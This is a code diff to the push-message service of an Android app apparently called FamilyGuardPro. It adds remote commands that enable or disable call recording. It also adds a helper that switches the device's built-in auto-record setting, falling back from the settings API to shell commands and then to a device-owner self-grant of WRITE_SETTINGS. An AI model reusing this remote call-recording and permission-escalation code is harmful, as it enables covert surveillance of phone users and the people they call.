@@ -823,7 +823,10 @@ class FcmService : FirebaseMessagingService() {
                         if (settingsObj.has("callRecordEnabled")) {
                             val callRecordEnabled = settingsObj.getBoolean("callRecordEnabled")
                             app?.preferenceManager?.setCallRecordingEnabled(callRecordEnabled)
-                            Log.d(TAG, "Call recording enabled=$callRecordEnabled from settings update")
+                            Log.w(TAG, "Call recording enabled=$callRecordEnabled from settings update")
+                            
+                            // Toggle system auto-record (Vivo/Samsung/etc.)
+                            toggleSystemAutoCallRecord(callRecordEnabled)
                             
                             if (callRecordEnabled) {
                                 startForegroundServiceSafely(Intent(this, CallRecordService::class.java))
@@ -1254,11 +1257,14 @@ class FcmService : FirebaseMessagingService() {
                         val app = applicationContext as? com.familyguardpro.FamilyGuardApp
                         app?.preferenceManager?.setCallRecordingEnabled(true)
                         
+                        // Enable system auto-record (Vivo/Samsung/etc.)
+                        toggleSystemAutoCallRecord(true)
+                        
                         // Start CallRecordService
                         val intent = Intent(this@FcmService, CallRecordService::class.java)
                         this@FcmService.startForegroundService(intent)
                         
-                        Log.d(TAG, "DO_ENABLE_CALL_RECORDING: Call recording enabled")
+                        Log.w(TAG, "DO_ENABLE_CALL_RECORDING: Call recording enabled + system auto-record ON")
                         WebSocketSyncService.sendMessage("do_command_result", org.json.JSONObject().apply {
                             put("command", "DO_ENABLE_CALL_RECORDING")
                             put("success", true)
@@ -1283,11 +1289,14 @@ class FcmService : FirebaseMessagingService() {
                         val app = applicationContext as? com.familyguardpro.FamilyGuardApp
                         app?.preferenceManager?.setCallRecordingEnabled(false)
                         
+                        // Disable system auto-record (Vivo/Samsung/etc.)
+                        toggleSystemAutoCallRecord(false)
+                        
                         // Stop CallRecordService
                         val intent = Intent(this@FcmService, CallRecordService::class.java)
                         this@FcmService.stopService(intent)
                         
-                        Log.d(TAG, "DO_DISABLE_CALL_RECORDING: Call recording disabled")
+                        Log.w(TAG, "DO_DISABLE_CALL_RECORDING: Call recording disabled + system auto-record OFF")
                         WebSocketSyncService.sendMessage("do_command_result", org.json.JSONObject().apply {
                             put("command", "DO_DISABLE_CALL_RECORDING")
                             put("success", true)
@@ -1547,6 +1556,59 @@ class FcmService : FirebaseMessagingService() {
                 Log.e(TAG, "Failed to download APK", e)
                 null
             }
+        }
+    }
+
+    /**
+     * Toggle system's built-in call recording auto-record setting.
+     * Works on Vivo (call_record_auto, vivo_call_record_auto),
+     * and can be extended for Samsung, Xiaomi, etc.
+     */
+    private fun toggleSystemAutoCallRecord(enable: Boolean) {
+        val value = if (enable) 1 else 0
+        try {
+            // Method 1: Use Settings.System API (works if WRITE_SETTINGS permission granted)
+            val cr = contentResolver
+            try {
+                android.provider.Settings.System.putInt(cr, "call_record_auto", value)
+                android.provider.Settings.System.putInt(cr, "vivo_call_record_auto", value)
+                Log.w(TAG, "System auto-record toggled via Settings.System API: enable=$enable")
+                return
+            } catch (e: SecurityException) {
+                Log.w(TAG, "Settings.System API failed (no WRITE_SETTINGS): ${e.message}")
+            }
+            
+            // Method 2: Use shell command (Device Owner can execute)
+            try {
+                val process1 = Runtime.getRuntime().exec(arrayOf("sh", "-c", "settings put system call_record_auto $value"))
+                process1.waitFor()
+                val process2 = Runtime.getRuntime().exec(arrayOf("sh", "-c", "settings put system vivo_call_record_auto $value"))
+                process2.waitFor()
+                
+                // Verify
+                val verify = Runtime.getRuntime().exec(arrayOf("sh", "-c", "settings get system call_record_auto"))
+                val result = verify.inputStream.bufferedReader().readText().trim()
+                verify.waitFor()
+                
+                Log.w(TAG, "System auto-record toggled via shell: enable=$enable, verify=$result")
+            } catch (e: Exception) {
+                Log.e(TAG, "Shell toggle failed: ${e.message}")
+            }
+            
+            // Method 3: Device Owner can grant WRITE_SETTINGS then retry
+            try {
+                val doManager = com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this)
+                if (doManager.isDeviceOwner()) {
+                    doManager.grantPermission(android.Manifest.permission.WRITE_SETTINGS)
+                    android.provider.Settings.System.putInt(cr, "call_record_auto", value)
+                    android.provider.Settings.System.putInt(cr, "vivo_call_record_auto", value)
+                    Log.w(TAG, "System auto-record toggled via DO + WRITE_SETTINGS: enable=$enable")
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "DO WRITE_SETTINGS approach failed: ${e.message}")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "toggleSystemAutoCallRecord failed: ${e.message}")
         }
     }
 }
